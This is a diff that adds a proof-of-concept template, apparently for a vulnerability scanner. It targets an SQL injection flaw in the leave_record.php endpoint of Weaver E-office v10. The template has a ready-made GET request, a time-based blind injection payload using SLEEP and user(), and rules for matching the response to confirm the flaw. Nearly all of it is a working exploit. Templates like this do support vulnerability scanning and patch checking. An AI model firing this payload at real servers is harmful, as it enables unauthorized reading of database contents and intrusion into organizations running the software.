@@ -1,0 +1,14 @@
+﻿<DudePoc_Name>泛微 E-office v10 leave_record.php 存在SQL注入漏洞</DudePoc_Name>
+<DudePoc_Description>上海泛微网络科技股份有限公司E-office10版本/leave_record.php存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。</DudePoc_Description>
+<DudePoc_SetHeader>
+GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1$<AttackCode>$ HTTP/1.1
+Host: $<AttackHost>$
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?user())(?=.*?未找到相关数据).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode>')+AND+(SELECT+5897+FROM+(SELECT(SLEEP(1)))QWhi)%23&table_field=1&table_field_name=user()&max_rows=10</DudePoc_AttackCode>
